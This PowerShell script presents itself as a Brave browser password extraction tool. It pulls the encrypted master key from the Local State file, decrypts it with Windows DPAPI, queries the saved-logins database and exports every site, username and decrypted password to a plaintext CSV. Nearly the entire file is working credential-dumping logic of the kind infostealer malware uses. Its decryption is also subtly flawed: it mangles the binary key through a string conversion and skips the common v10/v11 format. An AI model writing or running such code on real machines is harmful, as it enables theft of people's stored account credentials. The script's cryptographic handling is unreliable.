# Brave Browser Password Extraction Script
# Updated to support v20 encryption (AES-GCM)

param(
    [string]$CSVPath = ".\BravePasswords.csv"
)

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Core

Write-Host "Brave Password Extraction Tool" -ForegroundColor Green
Write-Host "==============================" -ForegroundColor Green

# Function to install SQLite3 if needed
function Install-SQLiteIfNeeded {
    try {
        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
        $tempZip = "sqlite-temp.zip"
        
        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
        
        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
        
        Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Failed to download SQLite3: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to decrypt data using Windows DPAPI
function Get-DecryptedData {
    param([byte[]]$EncryptedData)
    
    try {
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return $null
    }
}

# Function to extract master key from Brave's Local State file
function Get-BraveMasterKey {
    $braveDataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    $localStatePath = Join-Path $braveDataPath "Local State"
    
    if (-not (Test-Path $localStatePath)) {
        Write-Host "Local State file not found." -ForegroundColor Red
        return $null
    }
    
    try {
        Write-Host "Reading Local State file..." -ForegroundColor Yellow
        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localStateContent.os_crypt.encrypted_key
        
        if (-not $encryptedKey) {
            Write-Host "No encrypted key found in Local State" -ForegroundColor Red
            return $null
        }
        
        Write-Host "Found encrypted master key" -ForegroundColor Green
        
        # Decode from base64
        $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)
        Write-Host "Encrypted key length: $($encryptedKeyBytes.Length) bytes" -ForegroundColor Yellow
        
        # Remove the DPAPI prefix (first 5 bytes: "DPAPI")
        if ($encryptedKeyBytes.Length -gt 5) {
            $keyToDecrypt = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
            
            # Decrypt using DPAPI
            Write-Host "Decrypting master key..." -ForegroundColor Yellow
            $decryptedKeyString = Get-DecryptedData $keyToDecrypt
            
            if ($decryptedKeyString) {
                Write-Host "Successfully decrypted master key!" -ForegroundColor Green
                $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($decryptedKeyString)
                Write-Host "Master key length: $($keyBytes.Length) bytes" -ForegroundColor Green
                return $keyBytes
            } else {
                Write-Host "Failed to decrypt master key using DPAPI" -ForegroundColor Red
            }
        } else {
            Write-Host "Invalid master key format" -ForegroundColor Red
        }
    } catch {
        Write-Host "Error extracting master key: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $null
}

# Function to decrypt password data (supports v20 encryption)
function Decrypt-PasswordData {
    param(
        [byte[]]$EncryptedData,
        [byte[]]$MasterKey
    )
    
    Write-Host "Attempting to decrypt data of length: $($EncryptedData.Length) bytes" -ForegroundColor Yellow

    # Check for minimum length
    if ($EncryptedData.Length -lt 3) {
        Write-Host "Data too short for decryption" -ForegroundColor Red
        return "[Decryption failed: Data too short]"
    }

    # Detect encryption method
    $prefix = [System.Text.Encoding]::ASCII.GetString($EncryptedData, 0, 3)
    Write-Host "Data prefix: '$prefix'" -ForegroundColor Yellow

    # Handle v20 encryption (Brave-specific)
    if ($prefix -eq "v20") {
        Write-Host "Detected v20 encryption (Brave-specific)" -ForegroundColor Green
        
        try {
            # Check if data is long enough for v20 format
            if ($EncryptedData.Length -lt 15 + 16) { # v20 (3) + nonce (12) + minimum ciphertext + tag (16)
                Write-Host "v20 data too short for proper decryption" -ForegroundColor Red
                return "[v20 data too short]"
            }
            
            # Extract components from encrypted data
            # v20 format: "v20" (3 bytes) + nonce (12 bytes) + ciphertext + auth tag (16 bytes)
            $nonce = $EncryptedData[3..14]  # 12-byte nonce
            $ciphertextWithTag = $EncryptedData[15..($EncryptedData.Length - 1)]
            
            # The last 16 bytes are the authentication tag
            $ciphertext = $ciphertextWithTag[0..($ciphertextWithTag.Length - 17)]
            $authTag = $ciphertextWithTag[($ciphertextWithTag.Length - 16)..($ciphertextWithTag.Length - 1)]
            
            Write-Host "Nonce length: $($nonce.Length), Ciphertext length: $($ciphertext.Length), Tag length: $($authTag.Length)" -ForegroundColor Yellow

            # Create AES-GCM decryptor (requires .NET 5+)
            try {
                $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey)
                $plaintextBytes = [byte[]]::new($ciphertext.Length)
                
                # Decrypt using AES-GCM
                $aes.Decrypt($nonce, $ciphertext, $authTag, $plaintextBytes)
                
                # Convert to string
                $decrypted = [System.Text.Encoding]::UTF8.GetString($plaintextBytes)
                Write-Host "v20 decryption successful!" -ForegroundColor Green
                return $decrypted
                
            } catch {
                Write-Host "AES-GCM decryption failed: $($_.Exception.Message)" -ForegroundColor Red
                # Fallback to try DPAPI
                $dpapiResult = Get-DecryptedData $EncryptedData
                if ($dpapiResult) {
                    Write-Host "Fallback DPAPI decryption successful!" -ForegroundColor Green
                    return $dpapiResult
                }
                return "[v20 decryption failed]"
            }
            
        } catch {
            Write-Host "v20 decryption error: $($_.Exception.Message)" -ForegroundColor Red
            return "[v20 decryption error]"
        }
    }
    # Handle other encryption methods (v10/v11)
    elseif ($prefix -eq "v10" -or $prefix -eq "v11") {
        Write-Host "Detected modern encryption (v10/v11)" -ForegroundColor Green
        return "[Modern encryption - requires .NET 5+]"
    }
    # Fallback to DPAPI for legacy encryption (if applicable)
    else {
        Write-Host "Trying DPAPI decryption..." -ForegroundColor Yellow
        $result = Get-DecryptedData $EncryptedData
        if ($result) {
            Write-Host "DPAPI decryption successful!" -ForegroundColor Green
            return $result
        } else {
            Write-Host "All decryption methods failed" -ForegroundColor Red
            return "[Decryption failed]"
        }
    }
}

# Function to extract and decrypt passwords from Brave browser
function Get-BravePasswords {
    $braveDataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    $loginDataPath = Join-Path $braveDataPath "Default\Login Data"
    
    if (-not (Test-Path $loginDataPath)) {
        Write-Host "Brave login database not found." -ForegroundColor Red
        return @()
    }
    
    Write-Host "Found Brave login database" -ForegroundColor Green
    
    # Extract master key
    $masterKey = Get-BraveMasterKey
    if (-not $masterKey) {
        Write-Host "Cannot proceed without master key" -ForegroundColor Red
        return @()
    }
    
    $results = @()
    
    try {
        # Copy the database to avoid locking issues
        $tempDbPath = "temp_brave.db"
        Copy-Item $loginDataPath $tempDbPath -Force
        
        # Export data using SQLite
        $tempCsvPath = "temp_brave_output.csv"
        
        if (Test-Path ".\sqlite3.exe") {
            $sqlitePath = ".\sqlite3.exe"
        } else {
            $sqlitePath = "sqlite3"
        }
        
        # Query the database
        $query = "SELECT origin_url, username_value, hex(password_value) as password_hex FROM logins;"
        & $sqlitePath -csv -header $tempDbPath $query > $tempCsvPath
        
        if (Test-Path $tempCsvPath) {
            $logins = Import-Csv $tempCsvPath
            Write-Host "Found $($logins.Count) login entries in Brave" -ForegroundColor Green
            
            $counter = 0
            foreach ($login in $logins) {
                $counter++
                Write-Host "Processing entry $counter/$($logins.Count)..." -ForegroundColor Yellow
                
                $decryptedPassword = "[No Data]"
                
                if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$") {
                    try {
                        # Convert hex string to byte array
                        $hexString = $login.password_hex
                        Write-Host "Password data length: $($hexString.Length/2) bytes" -ForegroundColor Gray
                        
                        $passwordBytes = [byte[]]::new($hexString.Length / 2)
                        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
                            $passwordBytes[$i / 2] = [Convert]::ToByte($hexString.Substring($i, 2), 16)
                        }
                        
                        # Decrypt the password
                        $decryptedPassword = Decrypt-PasswordData $passwordBytes $masterKey
                        
                    } catch {
                        $decryptedPassword = "[Error: $($_.Exception.Message)]"
                    }
                }
                
                $results += [PSCustomObject]@{
                    Browser = "Brave"
                    URL = $login.origin_url
                    Username = $login.username_value
                    Password = $decryptedPassword
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
                
                # Show progress
                if ($counter % 10 -eq 0) {
                    Write-Host "Processed $counter entries..." -ForegroundColor Cyan
                }
            }
            
            Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
        }
        
        Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Host "Error processing Brave data: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $results
}

# Main execution
if (-not (Test-Path ".\sqlite3.exe")) {
    if (-not (Install-SQLiteIfNeeded)) {
        Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
        exit 1
    }
}

Write-Host "Starting Brave password extraction..." -ForegroundColor Green
$bravePasswords = Get-BravePasswords

# Display results
if ($bravePasswords.Count -gt 0) {
    Write-Host "`nProcessed $($bravePasswords.Count) passwords from Brave:" -ForegroundColor Green
    
    # Count successfully decrypted passwords
    $successCount = ($bravePasswords | Where-Object { 
        $_.Password -notmatch "\[.*\]" -and $_.Password -ne "[No Data]" 
    }).Count
    
    $successRate = [math]::Round(($successCount / $bravePasswords.Count) * 100, 2)
    
    # Show sample
    $bravePasswords | Select-Object -First 10 | Format-Table -Property URL, Username, Password -AutoSize
    
    # Export to CSV
    try {
        $bravePasswords | Export-Csv -Path $CSVPath -NoTypeInformation -Encoding UTF8 -Force
        Write-Host "`nExported to: $CSVPath" -ForegroundColor Green
        Write-Host "Success rate: $successRate% ($successCount/$($bravePasswords.Count))" -ForegroundColor Cyan
        
    } catch {
        Write-Host "CSV export failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
} else {
    Write-Host "No passwords found in Brave." -ForegroundColor Yellow
}

Write-Host "`nBrave password extraction completed." -ForegroundColor Green
